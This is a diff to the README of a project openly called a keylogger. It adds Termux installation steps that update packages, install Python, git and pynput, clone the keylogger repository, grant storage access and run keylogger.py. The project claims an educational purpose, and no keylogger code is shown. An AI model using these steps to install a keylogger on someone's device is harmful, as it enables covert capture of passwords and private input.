@@ -11,6 +11,12 @@ This project is **strictly for educational and ethical purposes**. Unauthorized 
 
 ## Installation
 ```bash
-git clone https://github.com/Riju-Rahaman/Keylogger.git
-cd Keylogger
+pkg update && pkg upgrade -y && \
+pkg install python -y && \
+python --version 
+pkg install git -y 
+git clone https://github.com/Riju-Rahaman/Keylogger.git 
+cd Keylogger 
+pip install pynput 
+termux-setup-storage
 python keylogger.py
